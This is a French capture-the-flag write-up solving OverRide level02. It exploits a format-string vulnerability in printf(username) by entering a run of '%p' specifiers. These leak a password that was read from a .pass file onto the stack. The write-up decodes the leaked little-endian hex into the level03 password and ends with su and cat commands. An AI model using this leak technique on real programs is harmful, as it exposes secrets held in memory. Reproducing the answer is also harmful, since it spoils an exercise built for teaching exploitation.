# Analyse du binaire level02

## 1. Observation et Reverse Engineering
En analysant le binaire, nous observons la logique suivante :
1. Le programme tente d'ouvrir le fichier "/home/users/level03/.pass".
2. S'il réussit, il lit les 41 premiers octets et les stocke dans un buffer sur la pile (stack) nommé 'pass_from_file'.
3. Il demande ensuite un 'Username' et un 'Password' à l'utilisateur.
4. En cas de mauvais mot de passe, le programme exécute la ligne suivante :
    printf(username);

### La Faille : Format String Vulnerability
L'absence de chaîne de formatage ("%s") dans le printf permet d'injecter des opérateurs de formatage dans le buffer 'username'. En entrant des "%p", nous pouvons forcer le programme à nous révéler le contenu de la pile (stack), là où le mot de passe du level03 a été précédemment chargé par la fonction fread.

## 2. Stratégie d'Exploitation
Le but est d'utiliser la vulnérabilité pour faire fuiter (leak) la mémoire de la pile jusqu'à atteindre l'emplacement du mot de passe lu depuis le fichier .pass.

### Étape 1 : Fuite de mémoire
Nous injectons une série de "%p" (environ 25) pour scanner la pile :
Saisie Username : %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p

Le dump nous montre des blocs hexadécimaux à partir de l'offset 22 qui correspondent à des caractères ASCII imprimables :
0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d

### Étape 2 : Décodage Little Endian
L'architecture étant en Little Endian, chaque bloc de 8 octets doit être lu de droite à gauche (inversion des octets) pour retrouver la chaîne originale.

Exemple : 0x756e505234376848 
-> Inversé : 48 68 37 34 52 50 6e 75 
-> ASCII : Hh74RPnu

## 3. Implémentation

En décodant et en corrigeant les offsets, nous obtenons les segments suivants :
1. 0x756e505234376848 -> Hh74RPnu
2. 0x45414a3561733951 -> Q9sa5JAE
3. 0x377a7143574e6758 -> XgNWCqz7
4. 0x354a35686e475873 -> sXGnh5J5
5. 0x48336750664b394d -> M9KfPg3H

## 4. Résolution
Mot de passe final : Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H

Commandes :
$> su level03
Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
level03@OverRide:~$ cat /home/users/level03/.pass